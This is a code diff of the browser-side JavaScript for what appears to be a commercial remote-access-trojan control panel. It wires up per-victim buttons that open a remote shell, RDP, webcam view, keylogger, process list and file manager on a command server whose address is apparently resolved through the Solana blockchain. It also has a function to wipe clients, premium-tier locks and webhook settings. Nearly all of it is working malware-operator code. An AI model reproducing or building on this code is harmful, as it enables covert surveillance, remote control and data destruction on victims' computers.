@@ -25,7 +25,6 @@ async function loadMe() {
   $('a-akey').textContent = me.accountKey;
   revealSetup('a-ltok', me.loginToken);
 
-  // ── premium lock: clicking remote without premium just says so ──
   const remoteTab = document.querySelector('.nav a[data-tab="remote"]');
   if (remoteTab && !me.isPremium) {
     remoteTab.classList.add('locked');
@@ -48,6 +47,7 @@ async function loadMe() {
     }, true);
   }
 }
+
 function revealSetup(id, value) {
   const el = $(id);
   if (!el) return;
@@ -145,7 +145,6 @@ function privBadge(p) {
   return `<span class="priv-badge">${label}</span>`;
 }
 
-// ---------- HOSTS ----------
 async function loadHosts() {
   const s = state.hosts;
   const q = new URLSearchParams({
@@ -264,7 +263,7 @@ async function loadUploads(clientId, container) {
   });
 }
 
-// ---------- REMOTE OPENER (Dynamic IP) ----------
+// ---------- REMOTE OPENER ----------
 async function getRemoteIp() {
   try {
     const r = await fetch('/api/remote_ip');
@@ -276,42 +275,42 @@ async function getRemoteIp() {
 
 async function openConsole(c, shell) {
   const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found');
+  if (!ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
   window.open(`http://${ip}:3000/cmd.html?` + q.toString(), '_blank', 'width=1000,height=640');
 }
 
 async function openRdp(c) {
   const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found');
+  if (!ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open(`http://${ip}:3000/rdp.html?` + q.toString(), '_blank', 'width=1200,height=760');
 }
 
 async function openWebcam(c) {
   const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found');
+  if (!ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open(`http://${ip}:3000/webcam.html?` + q.toString(), '_blank', 'width=1000,height=700');
 }
 
 async function openKeylog(c) {
   const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found');
+  if (!ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open(`http://${ip}:3000/keylog.html?` + q.toString(), '_blank', 'width=1000,height=700');
 }
 
 async function openProcs(c) {
   const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found');
+  if (!ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open(`http://${ip}:3000/procs.html?` + q.toString(), '_blank', 'width=1100,height=800');
 }
 
 async function openFileManager(c) {
   const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found');
+  if (!ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open(`http://${ip}:3000/files.html?` + q.toString(), '_blank', 'width=1000,height=700');
   closeDrawer();
@@ -326,7 +325,6 @@ $('drawer-close').addEventListener('click', closeDrawer);
 $('drawer-backdrop').addEventListener('click', closeDrawer);
 document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });
 
-// ---------- REMOTE ----------
 async function loadRemote() {
   const s = state.remote;
   const q = new URLSearchParams({
@@ -448,7 +446,6 @@ async function wipeClient(c) {
   }
 }
 
-// ---------- toolbar wiring ----------
 function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }
 
 $('h-search').addEventListener('input', debounce((e) => { state.hosts.q = e.target.value; state.hosts.offset = 0; loadHosts(); }, 220));
@@ -462,7 +459,6 @@ $('r-refresh').addEventListener('click', () => { state.remote.offset = 0; loadRe
 $('r-prev').addEventListener('click', () => { state.remote.offset = Math.max(0, state.remote.offset - REMOTE_PAGE_SIZE); loadRemote(); });
 $('r-next').addEventListener('click', () => { state.remote.offset += REMOTE_PAGE_SIZE; loadRemote(); });
 
-// ---------- settings ----------
 $('whtest').addEventListener('click', async () => {
   $('wherr').textContent = '';
   const r = await fetch('/api/webhook/test', {
